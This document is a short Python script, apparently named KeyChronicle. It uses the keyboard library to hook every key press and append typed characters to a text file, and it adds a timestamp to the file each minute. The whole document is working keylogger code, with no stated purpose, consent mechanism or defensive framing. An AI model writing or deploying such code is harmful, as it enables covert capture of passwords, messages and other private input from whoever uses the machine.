import keyboard
import datetime
import time

output_file = 'KeyChronicleData.txt'

# Create a function to Write the key to the output file
def save_key(e):
    key = e.name
    if len(key) == 1:
        with open(output_file, 'a') as f:
            f.write(f"{key}")

keyboard.on_press(save_key)

# Create a function to log the date and time every one minute
def log_date_time():
    while True:
        with open(output_file, 'a') as f:
            f.write(f"\n Date/Time: {datetime.datetime.now()} \n")
        time.sleep(60)  # sleep for 60 seconds (1 minute)

# Start logging the date and time every one minute
log_date_time();

# Start the keyboard listener
keyboard.wait()
